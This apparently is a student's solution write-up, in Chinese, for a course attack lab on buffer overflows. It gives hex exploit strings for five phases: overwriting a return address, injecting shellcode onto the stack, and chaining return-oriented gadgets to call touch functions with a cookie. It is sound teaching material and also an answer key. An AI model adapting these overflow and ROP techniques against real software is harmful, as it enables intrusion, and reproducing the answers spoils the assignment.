### phase1
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
9c 17 40
```
将Getbuf函数中`sub 0x28,%rsp`对应的40个字节补全后，向函数传入touch1函数的入口地址即可后续**ret**到touch1

### phase2
```
48 c7 c7 bf 7b 92 76    /* mov $0x76927bbf,%rdi */
68 c8 17 40 00          /* pushq 0x00000000004017c8 */
c3      		        /* ret */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00
68 fd 66 55 00 00 00 00 /* cookie 放在 -0x28(%rsp) */
```
将cookie放在%rsp的低地址0x28处（安全位置），在ret到该位置后执行`mov cookie，%rdi` 和ret到touch2的两个命令

### phase3
```
48 8d 7c 24 18          /* lea 0x18(%rsp),%rdi 为指向cookie的指针 */
68 d9 18 40 00          /* pushq 0x00000000004018d9 */
c3      		        /* ret */
00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
68 fd 66 55 00 00 00 00 /* stack top */
00 00 00 00 00 00 00 00 /* 以下几行为函数栈，会覆盖cookie */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
37 36 39 32 37 62 62 66
00 00 00 00 00 00 00 00 /* 将 cookie 放到安全位置 */
```
需要将cookie的str形式（ascii码）同样放到一个安全的不会覆盖的位置，向%rdi赋值后ret到touch3

### phase4
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
81 19 40 00 00 00 00 00 /* gadget 1: pop %rax */
bf 7b 92 76 00 00 00 00 /* cookie */
85 19 40 00 00 00 00 00 /* gadget 2: movq %rax, %rdi */
c8 17 40 00 00 00 00 00 /* ret touch2 */
```
将 cookie 用0x401981地址处的gadget**pop**到%rax，再用另一个gadget将%rax的值赋给%rdi，最后ret到touch2

### phase5
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
/* 配置%rdi */
58 1a 40 00 00 00 00 00 /* gadget 1: movq %rsp,%rax */
8b 19 40 00 00 00 00 00 /* gadget 2: movq %rax,%rdi */
/* 配置%rsi */
81 19 40 00 00 00 00 00 /* gadget 3: pop %rax */
48 00 00 00 00 00 00 00 /* 偏移量 $0x48 */
51 1a 40 00 00 00 00 00 /* gadget 4: movl %eax,%edx */ 
e6 19 40 00 00 00 00 00 /* gadget 5: movl %edx,%ecx */
cb 19 40 00 00 00 00 00 /* gadget 6: movl %ecx,%esi */ 
/* 将str赋给%rdi */
b1 19 40 00 00 00 00 00 /* gadget 7: lea (%rdi, %rsi, 1),%rax */
8b 19 40 00 00 00 00 00 /* gadget 8: movq %rax,%rdi */
d9 18 40 00 00 00 00 00 /* touch3 */
37 36 39 32 37 62 62 66 /* cookie */
00 00 00 00 00 00 00 00 
```
从farm寻找可用的gadget发现可用`add_xy`函数中的`lea (%rdi, %rsi, 1),%rax`来得到cookie的str表示指针：
	1. 先将加数%rdi配置为栈指针%rsp当前的位置
	2. 再将cookie存放位置和%rdi指向位置之间的偏移量赋值给加数%rsi
中间多次通过可用的gadget来传递值。